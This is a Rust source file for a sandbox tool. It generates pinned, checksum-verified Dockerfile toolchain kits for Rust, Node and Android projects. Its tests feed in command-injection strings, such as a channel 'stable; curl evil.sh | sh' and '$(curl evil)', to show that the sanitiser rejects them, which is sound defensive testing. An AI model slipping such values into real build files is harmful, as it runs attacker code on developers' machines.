//! Toolchain kits: Dockerfile snippets layered on the base image, picked from the
//! files in the project, plus the caches that make repeat runs fast.

use std::path::Path;

use anyhow::{Result, bail};

pub const KIT_NAMES: [&str; 3] = ["rust", "node", "android"];

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Kit {
    pub name: &'static str,
    /// Human-readable version, shown in the launch summary.
    pub version: String,
    /// Dockerfile lines appended after `FROM <base>`.
    pub dockerfile: String,
    /// Host-backed caches mounted into the box, as (cache name, box path). A cache
    /// may appear twice to be visible at two paths.
    pub caches: Vec<(&'static str, String)>,
    /// Project-relative dirs replaced by a box-only cache, so Linux build output never
    /// mixes with the host's.
    pub artifacts: Vec<&'static str>,
    /// Files written into a cache before the box starts, as (cache, relative path,
    /// contents, overwrite). Existing files are kept unless `overwrite` is set.
    pub seeds: Vec<(&'static str, String, Vec<u8>, bool)>,
    /// Runs x86_64 binaries (via Rosetta on Apple silicon).
    pub needs_x86_64: bool,
    /// Printed before the box starts.
    pub warnings: Vec<String>,
}

impl Kit {
    pub fn label(&self) -> String {
        format!("{} {}", self.name, self.version)
    }
}

/// Which kits to use: explicit `--kit` values win over detection; `--kit none` disables both.
pub fn resolve(root: &Path, requested: &[String]) -> Result<Vec<Kit>> {
    if requested.iter().any(|k| k == "none") {
        if requested.len() > 1 {
            bail!("--kit none can't be combined with other kits");
        }
        return Ok(vec![]);
    }
    if requested.is_empty() {
        return Ok(detect(root));
    }
    let mut kits = Vec::new();
    for name in requested {
        match name.as_str() {
            "rust" => kits.push(rust(root)),
            "node" => kits.push(node(root)),
            "android" => kits.push(android(root)),
            other => bail!(
                "unknown kit `{other}` (available: {}, or none)",
                KIT_NAMES.join(", ")
            ),
        }
    }
    let mut seen = Vec::new();
    kits.retain(|k| {
        let first = !seen.contains(&k.name);
        seen.push(k.name);
        first
    });
    Ok(kits)
}

pub fn detect(root: &Path) -> Vec<Kit> {
    let mut kits = Vec::new();
    if root.join("Cargo.toml").is_file() {
        kits.push(rust(root));
    }
    if root.join("package.json").is_file() {
        kits.push(node(root));
    }
    if is_android(root) {
        kits.push(android(root));
    }
    kits
}

/// An Android Gradle project: a build or settings file (or the version catalog) at the
/// root or one level down mentions the Android Gradle plugin.
fn is_android(root: &Path) -> bool {
    let names = [
        "build.gradle",
        "build.gradle.kts",
        "settings.gradle",
        "settings.gradle.kts",
        "gradle/libs.versions.toml",
    ];
    let mentions_agp = |path: &Path| {
        std::fs::read_to_string(path).is_ok_and(|t| {
            t.contains("com.android.application")
                || t.contains("com.android.library")
                || t.contains("com.android.tools.build")
        })
    };
    let dirs = std::iter::once(root.to_path_buf()).chain(
        std::fs::read_dir(root)
            .into_iter()
            .flatten()
            .flatten()
            .map(|e| e.path())
            .filter(|p| p.is_dir()),
    );
    dirs.into_iter()
        .any(|dir| names.iter().any(|n| mentions_agp(&dir.join(n))))
}

#[derive(Debug, Default, PartialEq, Eq)]
struct RustToolchain {
    channel: Option<String>,
    components: Vec<String>,
    targets: Vec<String>,
}

/// cargo-nextest, pinned; the tarball is checked against the `.sha256` published
/// with the same GitHub release.
const NEXTEST_VERSION: &str = "0.9.146";
const NEXTEST_DOCKERFILE: &str = r#"RUN set -eu; \
    arch=$(uname -m); \
    base="https://github.com/nextest-rs/nextest/releases/download/cargo-nextest-{nextest}"; \
    f="cargo-nextest-{nextest}-$arch-unknown-linux-gnu.tar.gz"; \
    cd /tmp; \
    curl -fsSLO "$base/$f"; \
    curl -fsSL "$base/${f%.tar.gz}.sha256" | sha256sum -c -; \
    tar -xzf "$f" -C /usr/local/cargo/bin; \
    rm -f "$f"
"#;

fn rust(root: &Path) -> Kit {
    let pin = read_rust_toolchain(root);
    let channel = pin.channel.unwrap_or_else(|| "stable".into());
    let mut components = vec!["clippy".to_string(), "rustfmt".to_string()];
    for c in pin.components {
        if !components.contains(&c) {
            components.push(c);
        }
    }
    let targets = if pin.targets.is_empty() {
        String::new()
    } else {
        format!(" --target {}", pin.targets.join(","))
    };
    // Toolchains live in the image; the box runs as the host UID, so make them writable
    // for rustup's own bookkeeping. Writes land in the disposable container layer.
    let dockerfile = format!(
        "ENV RUSTUP_HOME=/usr/local/rustup CARGO_HOME=/usr/local/cargo PATH=/usr/local/cargo/bin:$PATH\n\
         RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \\\n \
         | sh -s -- -y --no-modify-path --profile minimal --default-toolchain {channel} \
         --component {components}{targets} \\\n \
         && chmod -R a+rwX /usr/local/rustup /usr/local/cargo\n{NEXTEST_DOCKERFILE}",
        components = components.join(","),
    )
    .replace("{nextest}", NEXTEST_VERSION);
    Kit {
        name: "rust",
        version: channel,
        dockerfile,
        caches: vec![
            ("cargo-registry", "/usr/local/cargo/registry".into()),
            ("cargo-git", "/usr/local/cargo/git".into()),
        ],
        artifacts: vec!["target"],
        seeds: vec![],
        needs_x86_64: false,
        warnings: vec![],
    }
}

/// Installs Node from nodejs.org. `{select}` is a jq filter over the release index
/// that yields the version; the tarball is verified against the release's
/// SHASUMS256.txt before it's unpacked.
const NODE_DOCKERFILE: &str = r#"ENV NPM_CONFIG_CACHE=/var/cache/sandbox/npm \
    npm_config_store_dir=/var/cache/sandbox/pnpm \
    YARN_CACHE_FOLDER=/var/cache/sandbox/yarn \
    COREPACK_HOME=/var/cache/sandbox/corepack \
    COREPACK_ENABLE_DOWNLOAD_PROMPT=0
RUN set -eu; \
    v=$(curl -fsSL https://nodejs.org/dist/index.json | jq -r '{select}'); \
    if [ -z "$v" ] || [ "$v" = null ]; then echo "no Node release matches {version}" >&2; exit 1; fi; \
    arch=$(dpkg --print-architecture | sed 's/amd64/x64/'); \
    f="node-$v-linux-$arch.tar.xz"; \
    cd /tmp; \
    curl -fsSLO "https://nodejs.org/dist/$v/$f"; \
    curl -fsSLO "https://nodejs.org/dist/$v/SHASUMS256.txt"; \
    grep " $f\$" SHASUMS256.txt | sha256sum -c -; \
    tar -xJf "$f" -C /usr/local --strip-components=1 --no-same-owner; \
    rm -f "$f" SHASUMS256.txt; \
    corepack enable 2>/dev/null || true; \
    mkdir -p /var/cache/sandbox; \
    chmod -R a+rwX /usr/local/lib/node_modules /usr/local/bin /var/cache/sandbox
"#;

fn node(root: &Path) -> Kit {
    let version = node_version(root).unwrap_or_else(|| "lts".into());
    // The pin is "lts", a major ("22") or an exact version ("22.11.0").
    let select = match version.as_str() {
        "lts" => "[.[] | select(.lts)][0].version".to_string(),
        v if v.contains('.') => format!("\"v{v}\""),
        major => format!("[.[] | select(.version | startswith(\"v{major}.\"))][0].version"),
    };
    let dockerfile = NODE_DOCKERFILE
        .replace("{select}", &select)
        .replace("{version}", &version);
    Kit {
        name: "node",
        version,
        dockerfile,
        caches: vec![
            ("npm-cache", "/var/cache/sandbox/npm".into()),
            ("pnpm-store", "/var/cache/sandbox/pnpm".into()),
            ("yarn-cache", "/var/cache/sandbox/yarn".into()),
            ("corepack", "/var/cache/sandbox/corepack".into()),
        ],
        artifacts: vec!["node_modules"],
        seeds: vec![],
        needs_x86_64: false,
        warnings: vec![],
    }
}

/// The project's Node pin: `.nvmrc`, `.node-version`, `.tool-versions`, then
/// `engines.node` in package.json. Returns "lts", a major, or an exact version.
fn node_version(root: &Path) -> Option<String> {
    let read = |name: &str| std::fs::read_to_string(root.join(name)).ok();
    let from_file = read(".nvmrc")
        .or_else(|| read(".node-version"))
        .and_then(|t| t.lines().next().map(str::to_string))
        .or_else(|| {
            read(".tool-versions")?
                .lines()
                .find_map(|l| {
                    l.strip_prefix("nodejs ")
                        .or_else(|| l.strip_prefix("node "))
                })
                .map(str::to_string)
        });
    if let Some(v) = from_file {
        return normalize_node_version(&v);
    }
    let pkg: serde_json::Value = serde_json::from_str(&read("package.json")?).ok()?;
    normalize_node_version(pkg["engines"]["node"].as_str()?)
}

/// Maps the many ways projects spell a Node version onto what the kit installs.
/// Ranges like ">=20" or "^20.1" install the newest release of their lowest major.
fn normalize_node_version(raw: &str) -> Option<String> {
    let v = raw.trim().trim_start_matches('v');
    if v.is_empty() || v.starts_with("lts") || v == "node" || v == "latest" || v == "*" {
        return Some("lts".into());
    }
    let exact = v.split('.').count() == 3 && v.split('.').all(|p| p.parse::<u32>().is_ok());
    if exact {
        return Some(v.to_string());
    }
    let major: String = v
        .trim_start_matches(|c: char| !c.is_ascii_digit())
        .chars()
        .take_while(|c| c.is_ascii_digit())
        .collect();
    major
        .parse::<u32>()
        .ok()
        .filter(|m| *m > 0)
        .map(|m| m.to_string())
}

/// Android command-line tools, pinned and verified (sha1 matches Google's
/// repository2-3.xml; sha256 computed from that download).
const ANDROID_CMDLINE_TOOLS: &str = "commandlinetools-linux-16111833_latest.zip";
const ANDROID_CMDLINE_TOOLS_SHA256: &str =
    "0877a1d048fe4a24efe2eff536ca4223f7adeb58648bb81909d33c446918cfa8";

/// JDK 17 (what AGP 8 and 9 require), the x86_64 libc that Google's x86_64-only
/// aapt2 needs on arm64, and the command-line tools with `sdkmanager` pointed at
/// the SDK cache. AGP downloads platforms and build-tools into that cache itself.
const ANDROID_DOCKERFILE: &str = r#"ENV ANDROID_HOME=/opt/android-sdk ANDROID_SDK_ROOT=/opt/android-sdk \
    GRADLE_USER_HOME=/var/cache/sandbox/gradle
RUN set -eu; \
    if [ "$(dpkg --print-architecture)" != amd64 ]; then dpkg --add-architecture amd64; fi; \
    apt-get update; \
    apt-get install -y --no-install-recommends openjdk-17-jdk-headless; \
    if [ "$(dpkg --print-architecture)" != amd64 ]; then \
      apt-get install -y --no-install-recommends libc6:amd64 libgcc-s1:amd64; fi; \
    rm -rf /var/lib/apt/lists/*; \
    cd /tmp; \
    curl -fsSLO "https://dl.google.com/android/repository/{zip}"; \
    echo "{sha256}  {zip}" | sha256sum -c -; \
    mkdir -p /opt/android-cmdline-tools; \
    unzip -q "{zip}" -d /opt/android-cmdline-tools; \
    mv /opt/android-cmdline-tools/cmdline-tools /opt/android-cmdline-tools/latest; \
    rm -f "{zip}"; \
    for tool in sdkmanager avdmanager; do \
      printf '#!/bin/sh\nexec /opt/android-cmdline-tools/latest/bin/%s --sdk_root="$ANDROID_HOME" "$@"\n' "$tool" \
        > "/usr/local/bin/$tool"; \
      chmod 755 "/usr/local/bin/$tool"; \
    done; \
    mkdir -p /opt/android-sdk /var/cache/sandbox/gradle /var/cache/sandbox/gradle-build; \
    chmod -R a+rwX /opt/android-sdk /var/cache/sandbox
ENV PATH=/opt/android-sdk/platform-tools:$PATH
"#;

/// Keeps the box's Gradle build output out of the project's `build/` dirs, so box
/// builds (Linux) and host builds (Android Studio) don't keep invalidating each other.
const GRADLE_BUILD_DIR_INIT: &str = r#"// Written by sandbox. Build output from the box goes to a cache instead of
// the project's build/ directories, which stay the host's.
allprojects {
    def rel = project.projectDir.absolutePath.replaceFirst('^/workspace/?', '')
    layout.buildDirectory.set(new File('/var/cache/sandbox/gradle-build/' + (rel ?: '_root'), 'build'))
}
"#;

fn android(root: &Path) -> Kit {
    let dockerfile = ANDROID_DOCKERFILE
        .replace("{zip}", ANDROID_CMDLINE_TOOLS)
        .replace("{sha256}", ANDROID_CMDLINE_TOOLS_SHA256);
    let mut caches = vec![
        ("android-sdk", "/opt/android-sdk".to_string()),
        ("gradle", "/var/cache/sandbox/gradle".to_string()),
        (
            "gradle-build",
            "/var/cache/sandbox/gradle-build".to_string(),
        ),
    ];
    // local.properties usually points at the host's SDK, and AGP prefers it over
    // ANDROID_HOME, so make the box's SDK visible at that path too.
    if let Some(sdk_dir) = local_sdk_dir(root) {
        caches.push(("android-sdk", sdk_dir));
    }
    let mut seeds = vec![(
        "gradle",
        "init.d/sandbox-build-dir.gradle".to_string(),
        GRADLE_BUILD_DIR_INIT.as_bytes().to_vec(),
        true,
    )];
    let licences = host_android_licences();
    let mut warnings = vec![];
    if licences.is_empty() {
        warnings.push(
            "android: no accepted Android SDK licences found on this machine. Read and accept \
             them once with `sandbox --kit android run -- sdkmanager --licenses`"
                .to_string(),
        );
    }
    for (name, contents) in licences {
        seeds.push(("android-sdk", format!("licenses/{name}"), contents, false));
    }
    Kit {
        name: "android",
        version: "jdk17".into(),
        dockerfile,
        caches,
        artifacts: vec![".gradle"],
        seeds,
        needs_x86_64: true,
        warnings,
    }
}

/// `sdk.dir` from local.properties, when it's a plain absolute path.
fn local_sdk_dir(root: &Path) -> Option<String> {
    let text = std::fs::read_to_string(root.join("local.properties")).ok()?;
    let value = text.lines().find_map(|l| {
        let (k, v) = l.split_once('=')?;
        (k.trim() == "sdk.dir").then(|| v.trim().replace("\\:", ":").replace("\\\\", "\\"))
    })?;
    let safe = value.starts_with('/')
        && value != "/"
        && !value.contains("..")
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "/._- ".contains(c));
    safe.then_some(value)
}

/// Licence files the user already accepted on the host (Android Studio or
/// `sdkmanager --licenses`). They hold hashes of the accepted licence texts.
fn host_android_licences() -> Vec<(String, Vec<u8>)> {
    let home = std::env::var_os("HOME").map(std::path::PathBuf::from);
    let candidates = ["ANDROID_HOME", "ANDROID_SDK_ROOT"]
        .iter()
        .filter_map(|v| std::env::var_os(v).map(std::path::PathBuf::from))
        .chain(
            home.iter()
                .flat_map(|h| [h.join("Library/Android/sdk"), h.join("Android/Sdk")]),
        );
    for sdk in candidates {
        let Ok(entries) = std::fs::read_dir(sdk.join("licenses")) else {
            continue;
        };
        let licences: Vec<_> = entries
            .flatten()
            .filter(|e| e.path().is_file())
            .filter_map(|e| {
                let name = e.file_name().to_string_lossy().into_owned();
                let safe = name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-');
                let contents = std::fs::read(e.path()).ok()?;
                (safe && contents.len() < 4096).then_some((name, contents))
            })
            .collect();
        if !licences.is_empty() {
            return licences;
        }
    }
    vec![]
}

/// Reads `rust-toolchain.toml`, or the legacy `rust-toolchain` file holding just a channel.
fn read_rust_toolchain(root: &Path) -> RustToolchain {
    if let Ok(text) = std::fs::read_to_string(root.join("rust-toolchain.toml")) {
        return parse_rust_toolchain_toml(&text);
    }
    if let Ok(text) = std::fs::read_to_string(root.join("rust-toolchain")) {
        let text = text.trim();
        if text.starts_with('[') {
            return parse_rust_toolchain_toml(text);
        }
        if !text.is_empty() {
            return RustToolchain {
                channel: Some(text.to_string()),
                ..Default::default()
            };
        }
    }
    RustToolchain::default()
}

fn parse_rust_toolchain_toml(text: &str) -> RustToolchain {
    let Ok(value) = text.parse::<toml::Table>() else {
        return RustToolchain::default();
    };
    let Some(toolchain) = value.get("toolchain").and_then(|t| t.as_table()) else {
        return RustToolchain::default();
    };
    let list = |key: &str| -> Vec<String> {
        toolchain
            .get(key)
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str())
                    .filter(|s| is_safe_token(s))
                    .map(String::from)
                    .collect()
            })
            .unwrap_or_default()
    };
    RustToolchain {
        channel: toolchain
            .get("channel")
            .and_then(|v| v.as_str())
            .filter(|s| is_safe_token(s))
            .map(String::from),
        components: list("components"),
        targets: list("targets"),
    }
}

/// Values from the repo end up in a Dockerfile `RUN` line, so only allow the
/// characters real channels, components and targets use.
fn is_safe_token(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.".contains(c))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tempdir(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("sandbox-kits-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn detects_rust_from_cargo_toml() {
        let dir = tempdir("detect");
        assert!(detect(&dir).is_empty());
        std::fs::write(dir.join("Cargo.toml"), "[package]\nname = \"x\"\n").unwrap();
        let kits = detect(&dir);
        assert_eq!(kits.len(), 1);
        assert_eq!(kits[0].label(), "rust stable");
        assert!(kits[0].dockerfile.contains("cargo-nextest-0.9.146"));
        assert!(kits[0].dockerfile.contains("sha256sum -c -"));
        assert_eq!(kits[0].artifacts, ["target"]);
    }

    #[test]
    fn honours_rust_toolchain_pin() {
        let dir = tempdir("pin");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        std::fs::write(
            dir.join("rust-toolchain.toml"),
            "[toolchain]\nchannel = \"1.89.0\"\ncomponents = [\"rust-src\", \"clippy\"]\ntargets = [\"wasm32-unknown-unknown\"]\n",
        )
        .unwrap();
        let kit = &detect(&dir)[0];
        assert_eq!(kit.version, "1.89.0");
        assert!(kit.dockerfile.contains("--default-toolchain 1.89.0"));
        assert!(
            kit.dockerfile
                .contains("--component clippy,rustfmt,rust-src")
        );
        assert!(kit.dockerfile.contains("--target wasm32-unknown-unknown"));
    }

    #[test]
    fn legacy_rust_toolchain_file() {
        let dir = tempdir("legacy");
        std::fs::write(dir.join("rust-toolchain"), "nightly-2026-01-01\n").unwrap();
        assert_eq!(
            read_rust_toolchain(&dir).channel.as_deref(),
            Some("nightly-2026-01-01")
        );
    }

    #[test]
    fn rejects_injection_from_repo_files() {
        let pin = parse_rust_toolchain_toml(
            "[toolchain]\nchannel = \"stable; curl evil.sh | sh\"\ncomponents = [\"ok\", \"$(boom)\"]\n",
        );
        assert_eq!(pin.channel, None);
        assert_eq!(pin.components, ["ok"]);
    }

    #[test]
    fn detects_node_and_reads_pins() {
        let dir = tempdir("node");
        std::fs::write(dir.join("package.json"), r#"{"engines":{"node":">=20.9"}}"#).unwrap();
        let kit = &detect(&dir)[0];
        assert_eq!(kit.label(), "node 20");
        assert!(kit.dockerfile.contains(r#"startswith("v20.")"#));
        assert!(kit.dockerfile.contains("sha256sum -c -"));
        assert_eq!(kit.artifacts, ["node_modules"]);

        std::fs::write(dir.join(".tool-versions"), "rust 1.89\nnodejs 22.11.0\n").unwrap();
        assert_eq!(node_version(&dir).as_deref(), Some("22.11.0"));
        std::fs::write(dir.join(".nvmrc"), "lts/iron\n").unwrap();
        assert_eq!(node_version(&dir).as_deref(), Some("lts"));
    }

    #[test]
    fn node_version_spellings() {
        for (raw, want) in [
            ("v22", Some("22")),
            ("22.x", Some("22")),
            ("^18.17.0", Some("18")),
            ("20.11.1", Some("20.11.1")),
            ("lts/*", Some("lts")),
            ("", Some("lts")),
            ("$(curl evil)", None),
        ] {
            assert_eq!(normalize_node_version(raw).as_deref(), want, "{raw}");
        }
    }

    #[test]
    fn rust_and_node_together() {
        let dir = tempdir("both");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        std::fs::write(dir.join("package.json"), "{}").unwrap();
        let names: Vec<_> = detect(&dir).iter().map(|k| k.name).collect();
        assert_eq!(names, ["rust", "node"]);
        let forced = resolve(&dir, &["node".into(), "rust".into(), "node".into()]).unwrap();
        assert_eq!(
            forced.iter().map(|k| k.name).collect::<Vec<_>>(),
            ["node", "rust"]
        );
    }

    #[test]
    fn detects_android_projects() {
        let dir = tempdir("android");
        std::fs::write(dir.join("settings.gradle.kts"), "include(\":app\")\n").unwrap();
        assert!(!is_android(&dir), "plain Gradle is not Android");
        std::fs::create_dir_all(dir.join("app")).unwrap();
        std::fs::write(
            dir.join("app/build.gradle.kts"),
            "plugins { id(\"com.android.application\") }\n",
        )
        .unwrap();
        assert!(is_android(&dir));
        let kit = detect(&dir)
            .into_iter()
            .find(|k| k.name == "android")
            .unwrap();
        assert!(kit.needs_x86_64);
        assert!(kit.dockerfile.contains(ANDROID_CMDLINE_TOOLS_SHA256));
        assert!(
            kit.seeds
                .iter()
                .any(|(c, p, _, _)| *c == "gradle" && p.ends_with("sandbox-build-dir.gradle"))
        );
    }

    #[test]
    fn mirrors_the_sdk_at_local_properties_path() {
        let dir = tempdir("localprops");
        std::fs::write(
            dir.join("local.properties"),
            "sdk.dir=/Users/me/Library/Android/sdk\n",
        )
        .unwrap();
        assert_eq!(
            local_sdk_dir(&dir).as_deref(),
            Some("/Users/me/Library/Android/sdk")
        );
        let kit = android(&dir);
        let sdk_paths: Vec<_> = kit
            .caches
            .iter()
            .filter(|(c, _)| *c == "android-sdk")
            .map(|(_, p)| p.as_str())
            .collect();
        assert_eq!(
            sdk_paths,
            ["/opt/android-sdk", "/Users/me/Library/Android/sdk"]
        );

        std::fs::write(
            dir.join("local.properties"),
            "sdk.dir=C\\:\\\\Android\\\\sdk\n",
        )
        .unwrap();
        assert_eq!(local_sdk_dir(&dir), None, "non-POSIX paths are ignored");
        std::fs::write(dir.join("local.properties"), "sdk.dir=/etc/../root\n").unwrap();
        assert_eq!(local_sdk_dir(&dir), None);
    }

    #[test]
    fn explicit_kits_override_detection() {
        let dir = tempdir("resolve");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        assert!(resolve(&dir, &["none".into()]).unwrap().is_empty());
        assert_eq!(
            resolve(&tempdir("empty"), &["rust".into()]).unwrap().len(),
            1
        );
        assert!(resolve(&dir, &["cobol".into()]).is_err());
        assert!(resolve(&dir, &["none".into(), "rust".into()]).is_err());
    }
}
